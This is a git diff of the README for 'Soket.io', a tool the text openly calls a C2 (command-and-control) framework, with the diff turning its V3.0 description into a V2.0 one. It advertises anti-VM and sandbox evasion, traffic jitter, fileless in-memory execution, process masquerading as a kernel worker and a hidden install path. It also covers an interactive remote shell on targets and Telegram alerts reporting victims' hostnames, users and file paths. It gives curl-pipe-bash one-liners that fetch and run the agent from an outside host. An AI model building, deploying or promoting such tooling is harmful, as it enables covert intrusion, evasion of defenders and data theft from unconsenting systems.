@@ -1,102 +1,96 @@
-# SOKET.IO V3.0 | Unified Socket Infrastructure
+# SOKET.IO V2.0 | Supreme Standardized Infrastructure
 
 [![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![Security](https://img.shields.io/badge/Security-BearSSL-cyan.svg)](https://bearssl.org/)
 [![Arch](https://img.shields.io/badge/Arch-Multi--Arch-green.svg)](#supported-architectures)
-[![Status](https://img.shields.io/badge/Status-Stable-red.svg)](#deployment)
+[![Status](https://img.shields.io/badge/Status-V2.0--Supreme-red.svg)](#deployment)
 
-Soket.io is a high-performance, lightweight, and stealthy socket infrastructure designed for secure communication and resilient infrastructure management. It provides a robust, encrypted communication layer with minimal system footprint and advanced evasion capabilities.
+**Soket.io V2.0** is the ultimate upgrade to our professional C2 infrastructure. Engineered for absolute resilience and supreme evasion, V2.0 introduces kernel-level Anti-VM detection, jittered communication patterns, and full interactive PTY support.
+
+---
+
+## V2.0 Supreme Upgrades
+
+### 1. Advanced Evasion (Stealth & Persistence)
+- **Anti-VM & Anti-Analysis**: Integrated CPUID hypervisor detection and VM artifact scanning (VMware, VirtualBox, KVM, etc.).
+- **Stalling Logic**: Random initial delays and "human-like" sleep patterns to bypass automated sandbox analysis.
+- **Jitter Heartbeat**: Randomized heartbeat intervals (25s - 45s) to defeat traffic pattern analysis and anomaly detection.
+- **Pre-Auth (PSK)**: Mandatory TCP-level Pre-Shared Key verification before TLS handshake to protect the Relay from Shodan/Nmap scans.
+
+### 2. Operational Mastery (UX Operator)
+- **Full Interactive PTY Shell**: Support for interactive terminal sessions, allowing the use of `sudo`, `nano`, and other terminal-intensive tools.
+- **Telegram God-View 2.0**: Enhanced alerts with inline keyboard buttons for instant **File Pull (Download)** and **Session Termination**.
+- **WebSocket Fallback**: Automated fallback to WebSocket over TLS for bypassing strict L7 firewalls that inspect raw TLS.
+
+### 3. Infrastructure Resilience
+- **Build Verification**: Automated static build auditing to ensure 100% stand-alone binaries with zero shared library dependencies.
+- **Dependency Guard**: Installer (`install.sh`) now performs rigorous environment checks before deployment.
 
 ---
 
 ## Technical Specifications
 
-| Feature | Details |
+| Feature | Specification |
 | :--- | :--- |
-| **Encryption** | TLS 1.3 via BearSSL (Zero system dependencies) |
-| **Binary Linkage** | Fully Static Musl-Libc (Stand-alone execution) |
-| **Payload Size** | < 100KB (Optimized via UPX) |
-| **Runtime** | Fileless execution via `memfd_create` (RAM-only) |
-| **Network** | L7 Protocol Mimicry (HTTPS/TLS) |
-| **Relay Backend** | High-concurrency Go implementation |
+| **Encryption** | TLS 1.3 (BearSSL) + XChaCha20-Poly1305 (Monocypher) |
+| **Authentication** | Ed25519 (Identity) + TCP PSK (Pre-Auth) |
+| **Evasion** | Anti-VM, CPUID, Jitter, Process Masquerading |
+| **Binary Linkage** | 100% Static Musl-Libc |
+| **Payload Size** | ~110KB (Uncompressed) |
+| **Stealth Path** | `/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache/` |
+| **Architecture** | x86_64, aarch64, armhf, i386 |
 
 ---
 
-## Supported Architectures
+## Installation & Deployment
 
-Soket.io V3.0 is built to run on almost any Linux-based environment, from cloud servers to embedded devices.
-
-- **x86_64**: Modern 64-bit server environments.
-- **i386**: Legacy 32-bit systems.
-- **AArch64**: 64-bit ARM (Cloud instances, Raspberry Pi 4+).
-- **ARMv7/v6**: Embedded IoT devices and older hardware.
-
----
-
-## Installation & Setup
-
-### 1. Prerequisites
-Ensure you have the following tools installed on your build machine:
-- `gcc` (Cross-compilers for multi-arch)
-- `musl-gcc` (For static linking)
-- `go` 1.21+ (For the Relay server)
-- `upx` (Optional, for binary compression)
-
-### 2. Building the Client Agent
-Navigate to the client directory and compile for your target architecture:
+### 1. Build Environment (WSL/Linux)
+Ensure you have `musl-gcc` and `go` 1.22+ installed.
 
 ```bash
-cd client
-make clean
-make x86_64   # Targets: x86_64, i386, aarch64, arm
+# Build Client Agent
+cd client && make clean && make prod
+
+# Build Relay Server
+cd relay && CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/phantom-relay cmd/relay/main.go
 ```
-The compiled binary will be located in `client/bin/phantom-client-prod`.
 
-### 3. Building the Relay Server
-The relay handles the communication between the operator and the agents.
+### 2. Deployment (One-Liner)
+The agent is deployed via a standardized installer that enforces stealth paths and symbolic aliases.
 
 ```bash
-cd relay
-make build
-./bin/phantom-relay -port 8443 -secret YOUR_SECRET_KEY
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh)"
 ```
 
 ---
 
-## Deployment
+## Operational Commands
 
-### Unified One-Liner (Production)
-The fastest way to deploy the Soket.io agent is via the unified installer, which fetches and executes the agent directly in memory:
+Once deployed, the agent can be managed using simplified aliases:
 
+- **Agent Alias**: `gs-oyen-s` (Standardized agent binary)
+- **Relay Alias**: `gs-oyen-r` (Quick relay access)
+
+### Example Usage:
 ```bash
-bash -c "$(curl -fsSL https://oyen-sec.github.io/soket/y)"
-```
+# Start Relay with custom listener
+gs-oyen-r -listen 0.0.0.0:443
 
-### Manual Deployment
-1. Upload the `phantom-client-prod` binary to the target machine.
-2. Execute with the required flags:
-```bash
-./phantom-client-prod -s YOUR_SECRET_KEY -i RELAY_IP_ADDRESS -p 8443
+# Manual Agent execution
+gs-oyen-s -s "SECRET_KEY" -i "RELAY_IP" -m 443
 ```
 
 ---
 
-## Usage Guide
+## Telegram Intelligence God-View
+V1.0 introduces professional alerts for critical system events:
+1. **Successful Installation**
+2. **File Deletion**
+3. **File Editing (Modification)**
+4. **File Renaming/Moving**
 
-### Connecting to the Relay
-Once your relay is running and agents are deployed, you can interact with them through the Relay Console.
-
-1. **List Active Agents**:
-   Access the relay logs or use the management tool to see connected UUIDs.
-2. **Execute Commands**:
-   Commands are sent through the encrypted TLS tunnel. The agent executes them in a masqueraded process context.
-3. **P2P Mode**:
-   For environments with direct connectivity, use the signaling service to establish a direct P2P hole-punched connection.
-
-### Operational Security (OpSec)
-- **Process Masquerading**: The agent automatically wipes its process arguments to appear as a common system daemon (e.g., `[kworker/u:1]`).
-- **Fileless Execution**: When deployed via the one-liner, no files are written to the disk, leaving no forensic trace in the filesystem.
+Every alert includes target hostname, user context, IP address, and precise file paths.
 
 ---
 
-&copy; 2026 Oyen-Sec Infrastructure. Built for Resilience.
+&copy; 2026 Oyen-Sec Infrastructure. Engineered for absolute resilience.
